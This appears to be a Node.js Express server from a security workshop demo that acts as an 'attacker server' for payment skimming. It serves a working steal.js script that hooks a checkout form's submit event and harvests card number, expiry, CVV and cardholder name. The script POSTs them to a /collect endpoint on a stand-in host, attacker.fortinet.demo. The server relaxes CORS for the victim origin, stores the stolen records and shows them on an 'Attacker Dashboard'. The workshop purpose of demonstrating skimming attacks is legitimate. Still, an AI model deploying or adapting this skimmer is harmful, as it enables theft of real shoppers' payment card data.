const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// In-memory store for workshop demo (stolen payloads)
const collected = [];

// Allow requests from payment.fortinet.demo origin so steal.js can POST from the victim page
const cors = (req, res, next) => {
  const allowedOrigin = process.env.ALLOWED_ORIGIN || 'http://payment.fortinet.demo';
  const origin = req.headers.origin;
  
  // Allow requests from payment.fortinet.demo
  if (origin && (origin === allowedOrigin || origin.includes('payment.fortinet.demo'))) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  } else {
    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
};
app.use(cors);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the script that steals form data and sends it here (CORS: browser allows fetch to this origin)
app.get('/steal.js', (req, res) => {
  const baseUrl = getTargetUrl(req);
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
(function() {
  var target = ${JSON.stringify(baseUrl)};
  
  function getFieldValue(id, name) {
    var el = document.getElementById(id);
    if (!el) el = document.querySelector('[name="' + name + '"]');
    return el ? el.value : '';
  }
  
  function send(data) {
    try {
      fetch(target + '/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).then(function(response) {
        console.log('[steal.js] Data sent successfully to attacker server');
      }).catch(function(err) {
        console.error('[steal.js] Error sending data:', err);
      });
    } catch (e) {
      console.error('[steal.js] Exception:', e);
    }
  }
  
  function harvest() {
    var cardNumber = getFieldValue('cardNumber', 'cardNumber');
    var expiry = getFieldValue('expiry', 'expiry');
    var cvv = getFieldValue('cvv', 'cvv');
    var cardName = getFieldValue('cardName', 'cardName');
    
    var data = {
      cardNumber: cardNumber,
      expiry: expiry,
      cvv: cvv,
      cardName: cardName,
      url: window.location.href,
      at: new Date().toISOString()
    };
    
    // Send if any field has data
    if (cardNumber || cardName || expiry || cvv) {
      console.log('[steal.js] Harvested form data on submit:', data);
      send(data);
    }
  }
  
  // Hook into form submission
  function attachListener() {
    var form = document.getElementById('payment-form');
    if (form) {
      form.addEventListener('submit', function(e) {
        // Harvest data when form is submitted
        harvest();
      });
      console.log('[steal.js] Hooked into form submit button');
    } else {
      console.warn('[steal.js] Form not found, retrying...');
      setTimeout(attachListener, 100);
    }
  }
  
  // Wait for DOM to be ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachListener);
  } else {
    attachListener();
  }
  
  console.log('[steal.js] Loaded and active - waiting for form submission');
})();
`);
});

function getTargetUrl(req) {
  // Use the configured domain and port from environment variables
  const domain = process.env.ATTACKER_DOMAIN || 'attacker.fortinet.demo';
  const port = process.env.ATTACKER_PORT || '8080';
  const proto = req.get('x-forwarded-proto') || req.protocol || 'http';
  // Include port if it's not the default HTTP port (80)
  if (port === '80') {
    return proto + '://' + domain;
  }
  return proto + '://' + domain + ':' + port;
}

// Receive exfiltrated data (CORS allows POST from victim origin)
app.post('/collect', (req, res) => {
  const payload = req.body || {};
  const timestamp = new Date().toISOString();
  const entry = { ...payload, received: timestamp };
  collected.push(entry);
  console.log('[COLLECT] Stolen data received:', JSON.stringify(payload, null, 2));
  console.log('[COLLECT] Total entries:', collected.length);
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.status(200).json({ success: true, received: timestamp });
});

// Optional: view collected data (for workshop demo)
app.get('/collected', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.json(collected);
});

// HTML dashboard to view collected data
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(getDashboardHtml(collected));
});

function escapeHtml(text) {
  if (!text) return 'N/A';
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return String(text).replace(/[&<>"']/g, m => map[m]);
}

function getDashboardHtml(data) {
  const items = data.map(item => `
    <tr>
      <td>${escapeHtml(item.cardNumber || 'N/A')}</td>
      <td>${escapeHtml(item.expiry || 'N/A')}</td>
      <td>${escapeHtml(item.cvv ? '***' : 'N/A')}</td>
      <td>${escapeHtml(item.cardName || 'N/A')}</td>
      <td>${escapeHtml(item.url || 'N/A')}</td>
      <td>${escapeHtml(item.received || item.at || 'N/A')}</td>
    </tr>
  `).join('');
  
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Attacker Dashboard - Collected Data</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px;
      animation: slideUp 0.5s ease-out;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      color: #333;
      margin-bottom: 10px;
      font-size: 32px;
      font-weight: 600;
    }
    .subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }
    .stat-card {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
    }
    .stat-card h3 {
      font-size: 36px;
      font-weight: 700;
      margin-bottom: 5px;
    }
    .stat-card p {
      font-size: 14px;
      opacity: 0.9;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: white;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    thead {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }
    th {
      padding: 15px;
      text-align: left;
      font-weight: 600;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    td {
      padding: 12px 15px;
      border-bottom: 1px solid #e0e0e0;
      font-size: 14px;
    }
    tbody tr:hover {
      background: #f5f5f5;
    }
    tbody tr:last-child td {
      border-bottom: none;
    }
    .empty {
      text-align: center;
      padding: 60px 20px;
      color: #999;
    }
    .empty svg {
      width: 80px;
      height: 80px;
      margin-bottom: 20px;
      opacity: 0.3;
    }
    .refresh-btn {
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 20px;
      transition: transform 0.2s;
    }
    .refresh-btn:hover {
      transform: translateY(-2px);
    }
    .badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 600;
      background: #f5576c;
      color: white;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔓 Attacker Dashboard</h1>
    <p class="subtitle">Exfiltrated credit card data (workshop demo)</p>
    
    <div class="stats">
      <div class="stat-card">
        <h3>${data.length}</h3>
        <p>Total Records</p>
      </div>
      <div class="stat-card">
        <h3>${data.filter(d => d.cardNumber).length}</h3>
        <p>With Card Numbers</p>
      </div>
      <div class="stat-card">
        <h3>${new Set(data.map(d => d.url)).size}</h3>
        <p>Unique Sources</p>
      </div>
    </div>
    
    <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
    
    ${data.length > 0 ? `
    <table>
      <thead>
        <tr>
          <th>Card Number</th>
          <th>Expiry</th>
          <th>CVV</th>
          <th>Name</th>
          <th>Source URL</th>
          <th>Received At</th>
        </tr>
      </thead>
      <tbody>
        ${items}
      </tbody>
    </table>
    ` : `
    <div class="empty">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
        <line x1="9" y1="9" x2="15" y2="15"></line>
        <line x1="15" y1="9" x2="9" y2="15"></line>
      </svg>
      <h3>No data collected yet</h3>
      <p>Fill out the form on the victim app to see exfiltrated data appear here</p>
    </div>
    `}
  </div>
</body>
</html>`;
}

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Attacker server listening on port ${PORT}`);
});
